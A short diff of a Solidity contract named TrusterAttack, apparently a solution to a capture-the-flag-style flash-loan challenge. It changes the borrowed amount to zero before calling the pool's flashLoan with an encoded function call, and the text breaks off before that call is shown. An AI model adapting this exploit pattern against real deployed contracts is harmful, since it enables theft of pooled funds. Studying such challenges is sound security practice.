@@ -31,10 +31,10 @@ contract TrusterAttack {
         attacker = attackerAddress;
         balance = token.balanceOf(pool);
 
+        uint256 transferAmount = 0;
 
-        uint256 transferAmount = 1;
         IPoolFunc(pool).flashLoan(
-            1,
+            transferAmount,
             address(this),
             tokenAddress,
             abi.encodeWithSignature(
